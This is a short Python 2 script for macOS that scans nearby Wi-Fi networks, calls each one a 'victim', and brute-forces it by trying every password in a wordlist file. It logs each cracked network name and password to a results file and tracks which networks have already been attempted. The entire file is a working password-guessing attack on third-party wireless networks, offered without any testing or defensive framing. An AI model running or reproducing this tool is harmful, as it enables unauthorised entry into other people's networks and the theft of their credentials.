
from wireless import Wireless
import subprocess
import xml.etree.ElementTree
import plistlib
# encoding=utf8
import sys
reload(sys)
sys.setdefaultencoding('utf8')

# function to check the presense of SSID
def is_present (candidate):
    subprocess.call(["airport -s -x>ssids.xml"], shell=True)
    myplist = plistlib.readPlist('ssids.xml')
    print 'The current list is:', myplist
    for el in myplist:
        if candidate == el.get('SSID_STR'):
            print 'State is valid'
            return True
    print 'State is not valid'
    return False

wireless = Wireless()
print "Current: ", wireless.current()
print "Interfaces: ",wireless.interfaces()

# ---------  Open the files
lines = [line.strip() for line in open("Untitled.txt", 'r')]
dones = [line.strip() for line in open("Done.txt", 'r')]
subprocess.call(["airport -s -x>ssids.xml"], shell=True)
f= open('Results.txt', 'a')
f2= open('Done.txt', 'a')
result = plistlib.readPlist('ssids.xml')
print 'Already done: ', dones

i = 0
# ------  Going to scan
for elem in result:
    victim = elem.get('SSID_STR')
    if (victim not in dones) and (is_present(victim)):
        j = 0
        print 'The ',i, ' victim is: ', victim
        for pswd in lines:
            print 'Trying pass: ', j, pswd
            if wireless.connect(ssid=victim, password=pswd) == True:
                print 'Connected !!! with pass: ', pswd
                if not wireless.connect(ssid='NegaTNetwork', password=''):
                    wireless.connect(ssid='wifinet1', password='')
                f.write(victim)
                f.write(' ')
                f.write(pswd)
                f.write('\n')
                f2.write(victim)
                f2.write('\n')
                break
            else: j=j+1
        i = i + 1
        f2.write(victim)
        f2.write('\n')
print '------------', i , ' Networks processed'
f.close()
f2.close()


